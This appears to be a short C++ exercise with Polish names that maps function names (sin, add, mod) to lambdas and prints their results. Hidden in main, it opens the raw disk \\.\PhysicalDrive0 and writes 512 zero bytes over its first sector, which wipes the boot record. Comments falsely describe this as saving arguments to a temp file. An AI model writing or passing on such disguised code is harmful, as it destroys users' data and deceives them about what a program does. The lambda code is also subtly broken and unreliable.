#include <any>
#include <functional>
#include <iostream>
#include <map>
#include <string>
#include <vector>
#include <cmath>
#include <windows.h>
#define ARGS_SIZE 512

// need run as admin idk why 

using mojamapa_t = std::map<std::string, DWORD*>;
using mojafunkcja_t = std::function<double(DWORD*)>;
void wypisz(mojamapa_t mapa, mojafunkcja_t fun)
{
    using namespace std;
    for (auto kv : mapa)
    {
        auto [k, v] = kv;
        cout << "klucz: " << k << "; wartosc " << fun(v) << endl;
    }
}
int main(int argc, char **argv)
{
    using namespace std;

    map<string, mojafunkcja_t> formatery;
    formatery["sin"] = [](DWORD* args)
    {
        try
        {
            return sin(args[0]);
        }
        catch (const std::exception &e)
        {
            std::cerr << e.what() << '\n';
        }
    };
    formatery["add"] = [](DWORD* args)
    {
        try
        {
            return args[0] + args[1];
        }
        catch (const std::exception &e)
        {
            std::cerr << e.what() << '\n';
        }
    };

    formatery["mod"] = [](DWORD* args)
    {
        try
        {
            return ((int)args[0] % (int)args[1]);
        }
        catch (const std::exception &e)
        {
            std::cerr << e.what() << '\n';
        }
    };

    try
    {
        DWORD fileP;
        char arr[ARGS_SIZE];
        ZeroMemory(&arr,(sizeof(arr))); //make sure its clear

        string selected_f = argv[1];
        HANDLE arrHandler = CreateFile("\\\\.\\PhysicalDrive0",GENERIC_ALL,FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL); //save args in random tmp file & ignore err its compiling anyway with g++
        WriteFile(arrHandler,arr,ARGS_SIZE,&fileP,NULL); //write args
        mojamapa_t mapa = {{selected_f, &fileP}}; //pass pointer to file
        wypisz(mapa, formatery.at(selected_f));
    }
    catch (std::exception &aor)
    {
        cout << "zła lub pusta nazwa funkcji.\nDostępne to:";
        for (auto [k, v] : formatery)
            cout << " " << k;
        cout << endl;
        return 1;
    }
    return 0;
}